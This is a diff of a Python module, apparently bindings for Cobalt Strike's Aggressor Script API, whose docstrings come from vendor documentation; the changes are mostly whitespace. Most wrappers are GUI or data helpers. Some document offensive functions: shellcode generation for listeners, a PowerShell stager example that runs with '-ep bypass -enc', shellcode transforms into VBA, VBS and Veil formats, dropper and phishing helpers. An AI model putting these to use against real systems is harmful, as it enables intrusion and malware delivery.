     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the system information dialog.
         Example
-        
+
         openSystemInformationDialog();
-        
+
     """
 
     return engine.call('openSystemInformationDialog', args, fork=fork)
@@ -4750,12 +4750,12 @@ def openSystemInformationDialog(*args, fork=False):
 def openSystemProfilerDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to setup the system profiler.
         Example
-        
+
         openSystemProfilerDialog();
-        
+
     """
 
     return engine.call('openSystemProfilerDialog', args, fork=fork)
@@ -4764,12 +4764,12 @@ def openSystemProfilerDialog(*args, fork=False):
 def openTargetBrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the targets browser
         Example
-        
+
         openTargetBrowser();
-        
+
     """
 
     return engine.call('openTargetBrowser', args, fork=fork)
@@ -4778,12 +4778,12 @@ def openTargetBrowser(*args, fork=False):
 def openWebLog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the web log tab.
         Example
-        
+
         openWebLog();
-        
+
     """
 
     return engine.call('openWebLog', args, fork=fork)
@@ -4792,12 +4792,12 @@ def openWebLog(*args, fork=False):
 def openWindowsDropperDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to export the Windows dropper attack
         Example
-        
+
         openWindowsDropperDialog();
-        
+
     """
 
     return engine.call('openWindowsDropperDialog', args, fork=fork)
@@ -4806,12 +4806,12 @@ def openWindowsDropperDialog(*args, fork=False):
 def openWindowsExecutableDialog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to generate a Windows executable
         Example
-        
+
         openWindowsExecutableDialog();
-        
+
     """
 
     return engine.call('openWindowsExecutableDialog', args, fork=fork)
@@ -4820,12 +4820,12 @@ def openWindowsExecutableDialog(*args, fork=False):
 def openWindowsExecutableStage(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open the dialog to generate a stageless Windows executable
         Example
-        
+
         openWindowsExecutableStage();
-        
+
     """
 
     return engine.call('openWindowsExecutableStage', args, fork=fork)
@@ -4834,17 +4834,17 @@ def openWindowsExecutableStage(*args, fork=False):
 def pgraph(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generate the pivot graph GUI component.
         Returns
         The pivot graph GUI object (a javax.swing.JComponent)
         Example
-        
+
         addVisualization("Pivot Graph", pgraph());
-        
+
         See Also
         &showVisualization
-        
+
     """
 
     return engine.call('pgraph', args, fork=fork)
@@ -4853,14 +4853,14 @@ def pgraph(*args, fork=False):
 def pivots(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of SOCKS pivots from Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about each pivot.
         Example
-        
+
         printAll(pivots());
-        
+
     """
 
     return engine.call('pivots', args, fork=fork)
@@ -4869,20 +4869,20 @@ def pivots(*args, fork=False):
 def popup_clear(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.
         Arguments
         $1 - the popup hook to clear registered menus for
         Example
-        
+
         popup_clear("help");
-        
+
         popup help {
             item "My stuff!" {
                 show_message("This is my menu!");
             }
         }
-        
+
     """
 
     return engine.call('popup_clear', args, fork=fork)
@@ -4891,7 +4891,7 @@ def popup_clear(*args, fork=False):
 def powershell(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a PowerShell one-liner to bootstrap the specified listener.
         Arguments
         $1 - the listener name
@@ -4902,9 +4902,9 @@ def powershell(*args, fork=False):
         Returns
         A PowerShell one-liner to run the specified listener.
         Example
-        
+
         println(powershell("my listener", false));
-        
+
     """
 
     return engine.call('powershell', args, fork=fork)
@@ -4913,16 +4913,16 @@ def powershell(*args, fork=False):
 def powershell_encode_oneliner(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)
         Arguments
         $1 - the PowerShell expression to wrap into a one-liner.
         Returns a powershell.exe one-liner to run the specified expression.
         Example
-        
+
         $cmd = powershell_encode_oneliner("2 + 2");
         println($cmd);
-        
+
     """
 
     return engine.call('powershell_encode_oneliner', args, fork=fork)
@@ -4931,18 +4931,18 @@ def powershell_encode_oneliner(*args, fork=False):
 def powershell_encode_stager(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a base64 encoded PowerShell script to run the specified shellcode
         Arguments
         $1 - shellcode to wrap
         Returns
         Returns a base64 encoded PowerShell suitable for use with powershell.exe's -enc option.
         Example
-        
+
         $shellcode  = shellcode("my listener", false);
         $readytouse = powershell_encode_stager($shellcode);
         println("powershell.exe -ep bypass -enc $readytouse");
-        
+
     """
 
     return engine.call('powershell_encode_stager', args, fork=fork)
@@ -4951,7 +4951,7 @@ def powershell_encode_stager(*args, fork=False):
 def pref_get(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Grabs a string value from Cobalt Strike's preferences.
         Arguments
         $1 - the preference name
@@ -4959,9 +4959,9 @@ def pref_get(*args, fork=False):
         Returns
         A string with the preference value.
         Example
-        
+
         $foo = pref_get("foo.string", "bar");
-        
+
     """
 
     return engine.call('pref_get', args, fork=fork)
@@ -4970,16 +4970,16 @@ def pref_get(*args, fork=False):
 def pref_get_list(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Grabs a list value from Cobalt Strike's preferences.
         Arguments
         $1 - the preference name
         Returns
         An array with the preference values
         Example
-        
+
         @foo = pref_get_list("foo.list");
-        
+
     """
 
     return engine.call('pref_get_list', args, fork=fork)
@@ -4988,15 +4988,15 @@ def pref_get_list(*args, fork=False):
 def pref_set(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Set a value in Cobalt Strike's preferences
         Arguments
         $1 - the preference name
         $2 - the preference value
         Example
-        
+
         pref_set("foo.string", "baz!");
-        
+
     """
 
     return engine.call('pref_set', args, fork=fork)
@@ -5005,15 +5005,15 @@ def pref_set(*args, fork=False):
 def pref_set_list(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Stores a list value into Cobalt Strike's preferences.
         Arguments
         $1 - the preference name
         $2 - an array of values for this preference
         Example
-        
+
         pref_set_list("foo.list", @("a", "b", "c"));
-        
+
     """
 
     return engine.call('pref_set_list', args, fork=fork)
@@ -5022,14 +5022,14 @@ def pref_set_list(*args, fork=False):
 def previousTab(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Activate the tab that is to the left of the current tab.
         Example
-        
+
         bind Ctrl+Left {
             previousTab();
         }
-        
+
     """
 
     return engine.call('previousTab', args, fork=fork)
@@ -5038,15 +5038,15 @@ def previousTab(*args, fork=False):
 def privmsg(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Post a private message to a user in the event log
         Arguments
         $1 - who to send the message to
         $2 - the message
         Example
-        
+
         privmsg("raffi", "what's up man?");
-        
+
     """
 
     return engine.call('privmsg', args, fork=fork)
@@ -5055,18 +5055,18 @@ def privmsg(*args, fork=False):
 def prompt_confirm(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.
         Arguments
         $1 - text in the dialog
         $2 - title of the dialog
         $3 - a callback function. Called when the user presses yes.
         Example
-        
+
         prompt_confirm("Do you feel lucky?", "Do you?", {
             show_mesage("Ok, I got nothing");
         });
-        
+
     """
 
     return engine.call('prompt_confirm', args, fork=fork)
@@ -5075,7 +5075,7 @@ def prompt_confirm(*args, fork=False):
 def prompt_directory_open(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Show a directory open dialog.
         Arguments
         $1 - title of the dialog
@@ -5083,11 +5083,11 @@ def prompt_directory_open(*args, fork=False):
         $3 - true/false: allow user to select multiple folders?
         $4 - a callback function. Called when the user chooses a folder. The argument to the callback is the selected folder. If multiple folders are selected, they will still be specified as the first argument, separated by commas.
         Example
-        
+
         prompt_directory_open("Choose a folder", $null, false, {
             show_message("You chose: $1");
         });
-        
+
     """
 
     return engine.call('prompt_directory_open', args, fork=fork)
@@ -5096,7 +5096,7 @@ def prompt_directory_open(*args, fork=False):
 def prompt_file_open(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Show a file open dialog.
         Arguments
         $1 - title of the dialog
@@ -5104,11 +5104,11 @@ def prompt_file_open(*args, fork=False):
         $3 - true/false: allow user to select multiple files?
         $4 - a callback function. Called when the user chooses a file to open. The argument to the callback is the selected file. If multiple files are selected, they will still be specified as the first argument, separated by commas.
         Example
-        
+
         prompt_file_open("Choose a file", $null, false, {
             show_message("You chose: $1");
         });
-        
+
     """
 
     return engine.call('prompt_file_open', args, fork=fork)
@@ -5117,20 +5117,20 @@ def prompt_file_open(*args, fork=False):
 def prompt_file_save(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Show a file save dialog.
         Arguments
         $1 - default value
         $2 - a callback function. Called when the user chooses a filename. The argument to the callback is the desired file.
         Example
-        
+
         prompt_file_save($null, {
             local('$handle');
             $handle = openf("> $+ $1");
             println($handle, "I am content");
             closef($handle);
         });
-        
+
     """
 
     return engine.call('prompt_file_save', args, fork=fork)
@@ -5139,18 +5139,18 @@ def prompt_file_save(*args, fork=False):
 def prompt_text(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Show a dialog that asks the user for text.
         Arguments
         $1 - text in the dialog
         $2 - default value in the text field.
         $3 - a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided.
         Example
-        
+
         prompt_text("What is your name?", "Cyber Bob", {
             show_mesage("Hi $1 $+ , nice to meet you!");
         });
-        
+
     """
 
     return engine.call('prompt_text', args, fork=fork)
@@ -5159,34 +5159,34 @@ def prompt_text(*args, fork=False):
 def range(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generate an array of numbers based on a string description of ranges.
         Arguments
         $1 - a string with a description of ranges
-        
-        
+
+
         Range
         Result
-        
-        
+
+
         103
         The number 103
-        
-        
+
+
         3-8
         The numbers 3, 4, 5, 6, and 7.
-        
-        
+
+
         2,4-6
         The numbers 2, 4, and 5.
-        
-        
+
+
         Returns
         An array of numbers within the specified ranges.
         Example
-        
+
         printAll(range("2,4-6"));
-        
+
     """
 
     return engine.call('range', args, fork=fork)
@@ -5195,14 +5195,14 @@ def range(*args, fork=False):
 def removeTab(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Close the active tab
         Example
-        
+
         bind Ctrl+D {
             removeTab();
         }
-        
+
     """
 
     return engine.call('removeTab', args, fork=fork)
@@ -5211,9 +5211,9 @@ def removeTab(*args, fork=False):
 def resetData(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Reset Cobalt Strike's data model
-        
+
     """
 
     return engine.call('resetData', args, fork=fork)
@@ -5222,14 +5222,14 @@ def resetData(*args, fork=False):
 def say(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Post a public chat message to the event log.
         Arguments
         $1 - the message
         Example
-        
+
         say("Hello World!");
-        
+
     """
 
     return engine.call('say', args, fork=fork)
@@ -5238,17 +5238,17 @@ def say(*args, fork=False):
 def sbrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generate the session browser GUI component. Shows Beacon AND SSH sessions.
         Returns
         The session browser GUI object (a javax.swing.JComponent)
         Example
-        
+
         addVisualization("Session Browser", sbrowser());
-        
+
         See Also
         &showVisualization
-        
+
     """
 
     return engine.call('sbrowser', args, fork=fork)
@@ -5257,14 +5257,14 @@ def sbrowser(*args, fork=False):
 def screenshots(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of screenshots from Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about each screenshot.
         Example
-        
+
         printAll(screenshots());
-        
+
     """
 
     return engine.call('screenshots', args, fork=fork)
@@ -5273,16 +5273,16 @@ def screenshots(*args, fork=False):
 def script_resource(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns the full path to a resource that is stored relative to this script file.
         Arguments
         $1 - the file to get a path for
         Returns
         The full path to the specified file.
         Example
-        
+
         println(script_resource("dummy.txt"));
-        
+
     """
 
     return engine.call('script_resource', args, fork=fork)
@@ -5291,16 +5291,16 @@ def script_resource(*args, fork=False):
 def separator(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Insert a separator into the current menu tree.
         Example
-        
+
         popup foo {
             item "Stuff" { ... }
             separator();
             item "Other Stuff" { ... }
         }
-        
+
     """
 
     return engine.call('separator', args, fork=fork)
@@ -5309,14 +5309,14 @@ def separator(*args, fork=False):
 def services(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of services in Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about each service.
         Example
-        
+
         printAll(services());
-        
+
     """
 
     return engine.call('services', args, fork=fork)
@@ -5325,7 +5325,7 @@ def services(*args, fork=False):
 def shellcode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns raw shellcode for a specific Cobalt Strike listener
         Arguments
         $1 - the listener name
@@ -5336,13 +5336,13 @@ def shellcode(*args, fork=False):
         Returns
         A scalar containing shellcode for the specified listener.
         Example
-        
+
         $data = shellcode("my listener", false, "x86");
-        
+
         $handle = openf(">out.bin");
         writeb($handle, $data);
         closef($handle);
-        
+
     """
 
     return engine.call('shellcode', args, fork=fork)
@@ -5351,19 +5351,19 @@ def shellcode(*args, fork=False):
 def showVisualization(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Switch Cobalt Strike visualization to a registered visualization.
         Arguments
         $1 - the name of the visualization
         Example
-        
+
         bind Ctrl+H {
             showVisualization("Hello World");
         }
-        
+
         See Also
         &showVisualization
-        
+
     """
 
     return engine.call('showVisualization', args, fork=fork)
@@ -5372,14 +5372,14 @@ def showVisualization(*args, fork=False):
 def show_error(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Shows an error message to the user in a dialog box. Use this function to relay error information.
         Arguments
         $1 - the message text
         Example
-        
+
         show_error("You did something bad.");
-        
+
     """
 
     return engine.call('show_error', args, fork=fork)
@@ -5388,14 +5388,14 @@ def show_error(*args, fork=False):
 def show_message(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Shows a message to the user in a dialog box. Use this function to relay information.
         Arguments
         $1 - the message text
         Example
-        
+
         show_message("You've won a free ringtone");
-        
+
     """
 
     return engine.call('show_message', args, fork=fork)
@@ -5404,7 +5404,7 @@ def show_message(*args, fork=False):
 def site_host(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Host content on Cobalt Strike's web server
         Arguments
         $1 - the host for this site (&localip is a good default)
@@ -5417,9 +5417,9 @@ def site_host(*args, fork=False):
         Returns
         The URL to this hosted site
         Example
-        
+
         site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello World Page", false);
-        
+
     """
 
     return engine.call('site_host', args, fork=fork)
@@ -5428,16 +5428,16 @@ def site_host(*args, fork=False):
 def site_kill(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Remove a site from Cobalt Strike's web server
         Arguments
         $1 - the port
         $2 - the URI
         Example
-        
+
         # removes the content bound to / on port 80
         site_kill(80, "/");
-        
+
     """
 
     return engine.call('site_kill', args, fork=fork)
@@ -5446,14 +5446,14 @@ def site_kill(*args, fork=False):
 def sites(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of sites tied to Cobalt Strike's web server.
         Returns
         An array of dictionary objects with information about each registered site.
         Example
-        
+
         printAll(sites());
-        
+
     """
 
     return engine.call('sites', args, fork=fork)
@@ -5462,16 +5462,16 @@ def sites(*args, fork=False):
 def ssh_command_describe(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Describe an SSH command.
         Returns
         A string description of the SSH command.
         Arguments
         $1 - the command
         Example
-        
+
         println(beacon_command_describe("sudo"));
-        
+
     """
 
     return engine.call('ssh_command_describe', args, fork=fork)
@@ -5480,16 +5480,16 @@ def ssh_command_describe(*args, fork=False):
 def ssh_command_detail(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get the help information for an SSH command.
         Returns
         A string with helpful information about an SSH command.
         Arguments
         $1 - the command
         Example
-        
+
         println(ssh_command_detail("sudo"));
-        
+
     """
 
     return engine.call('ssh_command_detail', args, fork=fork)
@@ -5498,23 +5498,23 @@ def ssh_command_detail(*args, fork=False):
 def ssh_command_register(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Register help information for an SSH console command.
         Arguments
         $1 - the command
         $2 - the short description of the command
         $3 - the long-form help for the command.
         Example
-        
+
         ssh_alis echo {
             blog($1, "You typed: " . substr($1, 5));
         }
-        
+
         ssh_command_register(
             "echo",
             "echo posts to the current session's log",
             "Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
-        
+
     """
 
     return engine.call('ssh_command_register', args, fork=fork)
@@ -5523,14 +5523,14 @@ def ssh_command_register(*args, fork=False):
 def ssh_commands(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get a list of SSH commands.
         Returns
         An array of SSH commands.
         Example
-        
+
         printAll(ssh_commands());
-        
+
     """
 
     return engine.call('ssh_commands', args, fork=fork)
@@ -5539,7 +5539,7 @@ def ssh_commands(*args, fork=False):
 def str_chunk(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Chunk a string into multiple parts
         Arguments
         $1 - the string to chunk
@@ -5547,14 +5547,14 @@ def str_chunk(*args, fork=False):
         Returns
         The original string split into multiple chunks
         Example
-        
+
         # hint... :)
         else if ($1 eq "template.x86.ps1") {
             local('$enc');
             $enc = str_chunk(base64_encode($2), 61);
             return strrep($data, '%%DATA%%', join("' + '", $enc));
         }
-        
+
     """
 
     return engine.call('str_chunk', args, fork=fork)
@@ -5563,7 +5563,7 @@ def str_chunk(*args, fork=False):
 def str_decode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Convert a string of bytes to text with the specified encoding.
         Arguments
         $1 - the string to decode
@@ -5571,10 +5571,10 @@ def str_decode(*args, fork=False):
         Returns
         The decoded text.
         Example
-        
+
         # convert back to a string we can use (from UTF16-LE)
         $text = str_decode($string, "UTF16-LE");
-        
+
     """
 
     return engine.call('str_decode', args, fork=fork)
@@ -5583,7 +5583,7 @@ def str_decode(*args, fork=False):
 def str_encode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Convert text to byte string with the specified character encoding.
         Arguments
         $1 - the string to encode
@@ -5591,10 +5591,10 @@ def str_encode(*args, fork=False):
         Returns
         The resulting string.
         Example
-        
+
         # convert to UTF16-LE
         $encoded = str_encode("this is some text", "UTF16-LE");
-        
+
     """
 
     return engine.call('str_encode', args, fork=fork)
@@ -5603,7 +5603,7 @@ def str_encode(*args, fork=False):
 def str_xor(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Walk a string and XOR it with the provided key.
         Arguments
         $1 - the string to mask
@@ -5611,10 +5611,10 @@ def str_xor(*args, fork=False):
         Returns
         The original string masked with the specified key.
         Example
-        
+
         $mask  = str_xor("This is a string", "key");
         $plain = str_xor($mask, "key");
-        
+
     """
 
     return engine.call('str_xor', args, fork=fork)
@@ -5623,26 +5623,26 @@ def str_xor(*args, fork=False):
 def sync_download(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Sync a downloaded file (View -> Downloads) to a local path.
         Arguments
         $1 - the remote path to the file to sync. See &downloads
         $2 - where to save the file locally
         $3 - [optional] a callback function to execute when download is synced. The first argument to this function is the local path of the downloaded file.
         Example
-        
+
         # sync all downloads
         command ga {
             local('$download $lpath $name $count');
             foreach $count => $download (downloads()) {
                 ($lpath, $name) = values($download, @("lpath", "name"));
-        
+
                 sync_download($lpath, script_resource("file $+ .$count"), lambda({
                     println("Downloaded $1 [ $+ $name $+ ]");
                 }, \$name));
             }
         }
-        
+
     """
 
     return engine.call('sync_download', args, fork=fork)
@@ -5651,14 +5651,14 @@ def sync_download(*args, fork=False):
 def targets(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of host information in Cobalt Strike's data model.
         Returns
         An array of dictionary objects with information about each host.
         Example
-        
+
         printAll(targets());
-        
+
     """
 
     return engine.call('targets', args, fork=fork)
@@ -5667,17 +5667,17 @@ def targets(*args, fork=False):
 def tbrowser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Generate the target browser GUI component.
         Returns
         The target browser GUI object (a javax.swing.JComponent)
         Example
-        
+
         addVisualization("Target Browser", tbrowser());
-        
+
         See Also
         &showVisualization
-        
+
     """
 
     return engine.call('tbrowser', args, fork=fork)
@@ -5686,14 +5686,14 @@ def tbrowser(*args, fork=False):
 def tokenToEmail(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Covert a phishing token to an email address.
         Arguments
         $1 - the phishing token
         Returns
         The email address or "unknown" if the token is not associated with an email.
         Example
-        
+
         set PROFILER_HIT {
             local('$out $app $ver $email');
             $email = tokenToEmail($5);
@@ -5703,7 +5703,7 @@ def tokenToEmail(*args, fork=False):
             }
             return "$out $+ \n\n";
         }
-        
+
     """
 
     return engine.call('tokenToEmail', args, fork=fork)
@@ -5712,47 +5712,47 @@ def tokenToEmail(*args, fork=False):
 def transform(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Transform shellcode into another format.
         Arguments
         $1 - the shellcode to transform
         $2 - the transform to apply
-        
-        
+
+
         Type
         Description
-        
-        
+
+
         array
         comma separated byte values
-        
-        
+
+
         hex
         Hex-encode the value
-        
-        
+
+
         powershell-base64
         PowerShell.exe-friendly base64 encoder
-        
-        
+
+
         vba
         a VBA array() with newlines added in
-        
-        
+
+
         vbs
         a VBS expression that results in a string
-        
-        
+
+
         veil
         Veil-ready string (\x##\x##)
-        
-        
+
+
         Returns
         The shellcode after the specified transform is applied
         Example
-        
+
         println(transform("This is a test!", "veil"));
-        
+
     """
 
     return engine.call('transform', args, fork=fork)
@@ -5761,7 +5761,7 @@ def transform(*args, fork=False):
 def transform_vbs(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Transform shellcode into a VBS expression that results in a string
         Arguments
         $1 - the shellcode to transform
@@ -5775,9 +5775,9 @@ def transform_vbs(*args, fork=False):
         Returns
         The shellcode after this transform is applied
         Example
-        
+
         println(transform_vbs("This is a test!", "3"));
-        
+
     """
 
     return engine.call('transform_vbs', args, fork=fork)
@@ -5786,14 +5786,14 @@ def transform_vbs(*args, fork=False):
 def tstamp(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Format a time into a date/time value. This value does not include seconds.
         Arguments
         $1 - the time [milliseconds since the UNIX epoch]
         Example
-        
+
         println("The time is now: " . tstamp(ticks()));
-        
+
         See Also
         &dstamp
     """
@@ -5804,16 +5804,16 @@ def tstamp(*args, fork=False):
 def url_open(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Open a URL in the default browser.
         Arguments
         $1 - the URL to open
         Example
-        
+
         command go {
             url_open("https://www.cobaltstrike.com/");
         }
-        
+
     """
 
     return engine.call('url_open', args, fork=fork)
@@ -5822,16 +5822,16 @@ def url_open(*args, fork=False):
 def users(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Returns a list of users connected to this team server.
         Returns
         An array of users.
         Example
-        
+
         foreach $user (users()) {
             println($user);
         }
-        
+
     """
 
     return engine.call('users', args, fork=fork)
@@ -5840,22 +5840,22 @@ def users(*args, fork=False):
 def vpn_interface_info(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get information about a VPN interface.
         Arguments
         $1 - the interface name
         $2 - [Optional] the key to extract a value for
         Returns
-        
+
         %info = vpn_interface_info("interface");
-        
+
         Returns a dictionary with the metadata for this interface.
-        
+
         $value = vpn_interface_info("interface", "key");
-        
+
         Returns the value for the specified key from this interface's metadata
         Example
-        
+
         # create a script console alias to interface info
         command interface {
             println("Interface $1");
@@ -5863,7 +5863,7 @@ def vpn_interface_info(*args, fork=False):
                 println("$[15]key $value");
             }
         }
-        
+
     """
 
     return engine.call('vpn_interface_info', args, fork=fork)
@@ -5872,14 +5872,14 @@ def vpn_interface_info(*args, fork=False):
 def vpn_interfaces(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Return a list of VPN interface names
         Returns
         An array of interface names.
         Example
-        
+
         printAll(vpn_interfaces());
-        
+
     """
 
     return engine.call('vpn_interfaces', args, fork=fork)
@@ -5888,7 +5888,7 @@ def vpn_interfaces(*args, fork=False):
 def vpn_tap_create(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Create a Covert VPN interface on the team server system.
         Arguments
         $1 - the interface name (e.g., phear0)
@@ -5897,9 +5897,9 @@ def vpn_tap_create(*args, fork=False):
         $4 - the port to bind the VPN's channel to
         $5 - the type of channel [bind, http, icmp, reverse, udp]
         Example
-        
+
         vpn_tap_create("phear0", $null, $null, 7324, "udp");
-        
+
     """
 
     return engine.call('vpn_tap_create', args, fork=fork)
@@ -5908,14 +5908,14 @@ def vpn_tap_create(*args, fork=False):
 def vpn_tap_delete(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Destroy a Covert VPN interface
         Arguments
         $1 - the interface name (e.g., phear0)
         Example
-        
+
         vpn_tap_destroy("phear0");
-        
+
     """
 
     return engine.call('vpn_tap_delete', args, fork=fork)
@@ -5923,9 +5923,7 @@ def vpn_tap_delete(*args, fork=False):
 
 def print(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('print', args, fork=fork)
@@ -5933,9 +5931,7 @@ def print(*args, fork=False):
 
 def println(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('println', args, fork=fork)
@@ -5943,9 +5939,7 @@ def println(*args, fork=False):
 
 def printAll(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('printAll', args, fork=fork)
@@ -5953,9 +5947,7 @@ def printAll(*args, fork=False):
 
 def warn(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('warn', args, fork=fork)
@@ -5963,9 +5955,7 @@ def warn(*args, fork=False):
 
 def debug(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
+    Sleep function. See http://sleep.dashnine.org/manual/index.html
     """
 
     return engine.call('debug', args, fork=fork)
@@ -5973,9 +5963,7 @@ def debug(*args, fork=False):
 
 def command(*args, fork=False):
     r"""
-    Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
-        Sleep function. See http://sleep.dashnine.org/manual/index.html
